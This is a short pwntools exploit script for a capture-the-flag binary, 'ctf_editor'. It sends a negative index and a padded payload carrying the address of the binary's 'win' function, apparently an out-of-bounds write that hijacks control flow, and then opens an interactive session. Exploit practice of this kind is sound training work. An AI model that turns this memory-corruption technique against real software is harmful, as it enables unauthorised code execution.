from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *main
continue
'''.format(**locals())

exe = './ctf_editor'
elf = context.binary = ELF(exe, checksec=False)
p = start()

# 0x404058
p.sendlineafter(b">>> ", b"Y")
p.sendlineafter(b">>> ", b"-3")
p.sendlineafter(b">>> ", b"aaaaa" + p64(elf.sym.win))
p.sendlineafter(b">>> ", b"Y")
p.sendlineafter(b">>> ", b"0")
p.sendlineafter(b">>> ", b"recon")

p.interactive()




